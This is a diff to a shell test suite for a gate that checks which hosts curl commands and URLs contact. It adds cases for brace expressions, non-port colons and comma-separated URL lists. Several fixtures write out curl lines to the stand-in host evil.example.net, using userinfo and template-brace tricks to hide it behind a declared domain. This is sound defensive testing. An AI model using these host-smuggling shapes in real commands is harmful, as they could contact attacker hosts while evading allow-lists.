@@ -427,6 +427,33 @@ check "ws on loopback" allow "$sample_dir/z5.rs" \
 check "leading dollar-brace host is skipped" allow "$sample_dir/z6.sh" \
   'curl -sSfL "https://${ARCHIVE_HOST}/erpc.tar.xz"'
 
+# An inner `}` inside a `${{ }}` expression, followed by a space, with a real
+# registrable domain after the closing `}}`. This is the case that makes the
+# `${{` arm of awk's expression tracking a control rather than an assumption,
+# and it was NOT obvious: the arm looked redundant, because `${` also starts
+# with `${` and every realistic Actions expression contains no inner brace,
+# so no case here distinguished the two and the mutation matrix reported the
+# arm as untested.
+#
+# It is not redundant. Without the `${{` arm, `${` pairs with the FIRST `}`,
+# the authority ends at the space that follows it, and what is left --
+# `${{ a }` -- is removed entirely by strip_expressions, so the host reads as
+# wholly templated and is SKIPPED. The `.evil.example.net` after the closing
+# braces is never seen. Constructing this input is what turned "probably
+# redundant" into "demonstrably required"; "no case fails without it" had
+# already been wrong once on this branch.
+check "an inner brace inside a workflow expression cannot hide a domain" block "$sample_dir/z7c.sh" \
+  'curl -sSfL "https://${{ a } b }}.evil.example.net/x"'
+
+# A SPACE inside a `${ }` expression. This is what makes awk's
+# expression tracking a tested control rather than an assumption: without
+# it the authority ends at the space, leaving the unbalanced `${ARCHIVE_HOST`
+# to be reported for an unexpected character. Every other `${ }` fixture
+# here is space-free, so none of them could tell the difference -- a shell
+# default value is the ordinary way a space gets in there.
+check "a space inside a dollar-brace default does not end the URL" allow "$sample_dir/z7b.sh" \
+  'curl -sSfL "https://${ARCHIVE_HOST:-fallback host}/erpc.tar.xz"'
+
 check "leading command substitution host is skipped" allow "$sample_dir/z7.sh" \
   'curl -sSfL "https://$(cat host)/erpc.tar.xz"'
 
@@ -601,30 +628,30 @@ check "an expression in userinfo does not hide the host" block "$sample_dir/a3.y
 # second control, and check_msg pins which host the gate resolved.
 check_msg "a declared host between two @ signs does not vouch" "$sample_dir/a7.sh" \
   'curl "https://a@user-api.erpc.global@evil.example.net/x"' \
-  'evil.example.net'
+  'https://evil.example.net'
 
 check_msg "the same shape in prose names the real host too" "$sample_dir/a7b.md" \
   'Run `curl "https://a@user-api.erpc.global@evil.example.net/x"` to fetch it.' \
-  'evil.example.net'
+  'https://evil.example.net'
 
 check_msg "a password before two @ signs does not vouch either" "$sample_dir/a8.sh" \
   'curl "https://u:p@user-api.erpc.global@evil.example.net/x"' \
-  'evil.example.net'
+  'https://evil.example.net'
 
 check_msg "a password before two @ signs, in prose" "$sample_dir/a8b.md" \
   'See https://u:p@user-api.erpc.global@evil.example.net/x for the form.' \
-  'evil.example.net'
+  'https://evil.example.net'
 
-# A STATED LIMIT, asserted so that it is a decision and not a surprise: a
-# colon that is not followed by digits ends the match, so the host judged is
-# the part before it. No URL parser accepts a non-numeric port -- node's
-# `new URL()` raises ERR_INVALID_URL and curl refuses it -- so the shape is
-# not a reachable destination, which is why this is `allow` rather than a
-# control. The maximal-munch guard that used to report it also reported
-# `url.strip_prefix("https://")` and `# see https://erpc.global: the home
-# page`, and its only unique catch was this unreachable shape.
-check "a non-numeric port ends the match, by stated limit" allow "$sample_dir/a9.sh" \
-  'curl "https://user-api.erpc.global:x.evil.example.net/y"'
+# NO LONGER A LIMIT. This was `allow` under the previous design, where the
+# match ended at the first colon and so judged the part before it: the gate
+# stated that as a limit and argued it was acceptable because no URL parser
+# accepts a non-numeric port. The inverted scanner does not end an authority
+# at a colon, so it sees the whole thing and asks whether what follows the
+# colon is a port. Here it is not, and the line is reported. One of the two
+# limits this rewrite removed outright rather than restating.
+check_msg "a colon that is not a port is reported" "$sample_dir/a9.sh" \
+  'curl "https://user-api.erpc.global:x.evil.example.net/y"' \
+  'is followed by something that is not a port'
 
 # The false positives that limit buys back. Each is a correct line.
 check "a bare scheme is not a truncated authority" allow "$sample_dir/a10.rs" \
@@ -689,6 +716,23 @@ check "a backtick-quoted declared host with a method call" allow "$sample_dir/c7
 
 check "a JSON array of two declared hosts" allow "$sample_dir/c8.json" \
   '{"u": ["https://erpc.global","https://github.com"]}'
+
+# TWO DECLARED HOSTS IN A COMMA-SEPARATED LIST, with no space. This is what
+# makes the separator split in normalise() a tested control. The split is
+# not needed for blocking power -- awk finds the second scheme occurrence
+# either way, because a comma is a word boundary -- so the mutation matrix
+# reported it as catching nothing, and no case here distinguished the two
+# designs. It earns its place on the other two counts, which this case and
+# the four invariant cases above together pin:
+#
+#   * without it this correct line is REPORTED. The first occurrence's
+#     authority runs to the second scheme's colon, `erpc.global,https`, and
+#     the tail test sees a trailing scheme word. With the split the line is
+#     two URLs, both declared, and allowed.
+#   * with it, the separator shapes name `two.evil.example.net` -- the host
+#     that would actually be contacted -- instead of a merged authority.
+check "two declared hosts separated by a comma" allow "$sample_dir/c9.sh" \
+  'curl https://erpc.global,https://github.com'
 
 # The slash-collapse rule is anchored on the left. Without that anchor the
 # scheme alternation matched the TAIL of any word, so `flows:`, `rows:` and
